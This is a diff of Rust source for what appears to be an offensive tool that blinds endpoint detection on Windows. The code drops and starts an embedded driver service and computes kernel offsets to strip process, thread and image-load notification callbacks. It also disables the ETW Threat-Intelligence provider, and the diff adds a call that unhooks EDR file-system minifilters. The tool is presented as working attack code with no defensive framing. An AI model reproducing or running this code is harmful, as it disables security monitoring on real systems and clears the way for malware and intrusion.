@@ -110,7 +110,7 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
             svc::write_embedded_file("C:\\um_pass.sys")?;
             // Try modifying the registry first
             svc::modify_svc_reg(svc_name, bin_path)
-                .expect("[!] Failed to modify service registry");
+                .expect("[!] Failed to modify service registry for umpass, trying something different (TKTK - need to add)");
             // If registry modification succeeds, start the service
             svc::start_svc(svc_name)
                 .expect("[!] Failed to start service");
@@ -153,20 +153,11 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
 
     // =-=-> Remove Process Creation Notification callback
     println!("[>] Removing notification callbacks:");
-    let process_create_notify_base = {
-        (nt_base as u64).wrapping_add(nt_offsets.psp_create_process_notify_routine as u64)
-    };
-    let thread_create_notify_base = {
-        (nt_base as u64).wrapping_add(nt_offsets.psp_create_thread_notify_routine as u64)
-    };
-    let img_load_notify_base = {
-        (nt_base as u64).wrapping_add(nt_offsets.psp_load_image_notify_routine as u64)
-    };
+    let process_create_notify_base = {(nt_base as u64).wrapping_add(nt_offsets.psp_create_process_notify_routine as u64)};
+    let thread_create_notify_base = {(nt_base as u64).wrapping_add(nt_offsets.psp_create_thread_notify_routine as u64)};
+    let img_load_notify_base = {(nt_base as u64).wrapping_add(nt_offsets.psp_load_image_notify_routine as u64)};
     
-    match xp::nerf_cb(
-        process_create_notify_base, 
-        "PspCreateProcessNotifyRoutine"
-    ) {
+    match xp::nerf_cb(process_create_notify_base, "PspCreateProcessNotifyRoutine") {
         Ok(_val) => {},
         Err(e) => eprintln!("[-] Callback nerfing failed: {:?}", e),
     }
@@ -182,9 +173,7 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
 
     // =-=-> Disable Etw-Ti provider
     let prov_status: u64;
-    let ti_handle = {
-        (nt_base as u64).wrapping_add(nt_offsets.threat_int_prov_reg_handle as u64)
-    };
+    let ti_handle = {(nt_base as u64).wrapping_add(nt_offsets.threat_int_prov_reg_handle as u64)};
     match xp::nerf_etw_prov(
         ti_handle, 
         "Etw-Ti", 
@@ -195,14 +184,20 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
             prov_status = val;
             println!("[*] Etw-Ti Provider enabled status: 0x{:x}", prov_status);
         }
-        Err(e) => eprintln!("[-] Failed to read: {:?}", e),
+        Err(e) => eprintln!("[-] Failed to read ETW provider: {:?}", e),
     }
 
 
     // =-=-> Unhook EDR file system minifilter entries
-    println!("[>] Targeting the file system minifilters [FltGlobals: 0x{:x}]", fm_offsets.flt_globals);
+    println!("[>] Targeting the file system minifilters.");
+    match xp::nerf_fs_miniflts(fm_offsets) {
+        Ok(_val) => {},
+        Err(e) => eprintln!("[-] FS miniflt nerfing failed: {:?}", e),
+    }
 
-    // Clean up: Write 0x1 back to PM. Can't read it again! :D
+
+
+    // =-=-> Clean up: Write 0x1 back to PM. Can't read it again! :D
     mem::write_byte(pm.unwrap() as usize as u64, 0x1);
 
     utils::is_edr_dll_loaded(4);
